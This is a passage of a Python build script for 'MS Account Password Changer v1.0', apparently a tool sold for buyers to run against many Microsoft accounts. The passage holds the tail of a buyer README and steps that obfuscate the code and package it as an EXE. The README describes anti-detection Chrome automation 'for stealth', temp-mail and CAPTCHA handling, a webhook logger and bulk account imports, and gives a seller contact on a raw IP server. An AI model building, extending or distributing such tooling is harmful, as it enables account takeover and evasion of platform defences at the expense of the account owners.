• Server credentials

Use environment variables:
import os
WEBHOOK_URL = os.getenv('WEBHOOK_URL', 'default_url')

📚 DEPENDENCIES EXPLAINED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

discord.py (2.3.0+)
  Purpose: Discord bot integration (for OTP sending)
  Usage: Not directly in client, but needed for server

Flask (3.0.0+)
  Purpose: Web server for authentication API
  Usage: Server-side only, client makes requests

requests (2.31.0+)
  Purpose: HTTP client for API calls, webhook, tempmail
  Usage: api_client.py, logger.py, tempmail.py, captcha.py

customtkinter (5.2.0+)
  Purpose: Modern Tkinter GUI framework
  Usage: All gui/ modules for interface

Pillow (10.0.0+)
  Purpose: Image processing
  Usage: captcha.py (CAPTCHA download), processing_screen.py (display)

selenium (4.15.0+)
  Purpose: Browser automation core
  Usage: All automation/ modules

undetected-chromedriver (3.5.0+)
  Purpose: Anti-detection Chrome driver
  Usage: driver.py for stealth

selenium-wire
  Purpose: Selenium with request/response interception
  Usage: driver.py for proxy support

aiohttp (3.9.0+)
  Purpose: Async HTTP (Discord bot dependency)
  Usage: Not directly used in client

pycountry
  Purpose: Country name validation
  Usage: core.py for region detection

webdriver-manager
  Purpose: Auto-download ChromeDriver
  Usage: driver.py for driver management

📞 SUPPORT & CONTACT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

For technical support, customization requests, or licensing:

Developer: Steve
Discord ID: 752512794624867352
Server: http://212.132.120.102:14307

When reporting issues, provide:
• Python version: python --version
• OS: Windows/Linux/Mac + version
• Error message: full traceback
• Steps to reproduce
• Screenshots if GUI issue

💡 TIPS FOR BUYERS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SOURCE CODE BUYERS:
-------------------
✓ Read this entire README before starting
✓ Test with 1-2 accounts first
✓ Understand the workflow before customizing
✓ Keep a backup of original source
✓ Document your changes
✓ Test thoroughly after modifications
✓ Contact Steve for help if stuck

CUSTOMIZATION IDEAS:
--------------------
• Add more password formats
• Integrate different temp email services
• Add database for result storage
• Build web interface version
• Add scheduling/automation
• Implement account validation
• Add success rate analytics
• Create account import from various sources

⚖️ LICENSE & LEGAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

This software is provided for authorized use only.

SOURCE CODE LICENSE:
• For personal/commercial use by licensee only
• No redistribution or resale of code
• No public posting or sharing
• Modifications allowed for own use
• Attribution required if sharing modified versions
• Tool by Steve - All rights reserved

DISCLAIMER:
• Software provided "as-is" without warranty
• Use at your own risk
• Respect Microsoft Terms of Service
• Ensure legal compliance in your jurisdiction
• Developer not responsible for misuse

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
MS Account Password Changer v1.0 | Source Code Edition
Tool by Steve | Protected Code | Authorized Use Only
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    return readme

def package():
    step("📦 Creating Release package...")
    rel = "Release"
    os.makedirs(rel, exist_ok=True)
    
    exe_src = f"dist/{APP_NAME}.exe"
    exe_dst = f"{rel}/{APP_NAME}.exe"

    if os.path.exists(exe_src):
        shutil.copy(exe_src, exe_dst)
        size_mb = os.path.getsize(exe_dst) / 1024 / 1024
        print(f"  ✅ {exe_dst} ({size_mb:.1f} MB)")
    else:
        print("  ❌ EXE not found!")
        return False

    
    readme_exe = create_readme_exe()
    readme_source = create_readme_source()
    
    with open(f"{rel}/README_EXE.txt", "w", encoding="utf-8") as f:
        f.write(readme_exe)
    print(f"  ✅ README_EXE.txt created")
    
    with open(f"{rel}/README_SOURCE.txt", "w", encoding="utf-8") as f:
        f.write(readme_source)
    print(f"  ✅ README_SOURCE.txt created")
    
    
    version_info = f"""MS Account Password Changer v{VERSION}
Built: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Python: {sys.version.split()[0]}
Platform: {sys.platform}
"""
    with open(f"{rel}/VERSION.txt", "w") as f:
        f.write(version_info)
    
    return True

def main():
    print("\n" + "="*70)
    print("  MS PASSWORD CHANGER - ADVANCED EXE BUILDER")
    print("  Version: " + VERSION)
    print("="*70)
    
    try:
        check_python_version()
        install_deps()
        ensure_packages()
        clean()
        create_pyinstaller_hooks()
        obf = obfuscate_code()
        build_exe(obf)
        
        if package():
            print("\n" + "="*70)
            print("  ✅ BUILD COMPLETE!")
            print(f"  📁 Release/{APP_NAME}.exe is ready")
            print(f"  📄 Release/README_EXE.txt for end users")
            print(f"  📄 Release/README_SOURCE.txt for developers")
            print("="*70 + "\n")
        else:
            print("\n❌ PACKAGING FAILED\n")
            sys.exit(1)
            
    except Exception as e:
        print(f"\n❌ BUILD FAILED: {e}\n")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()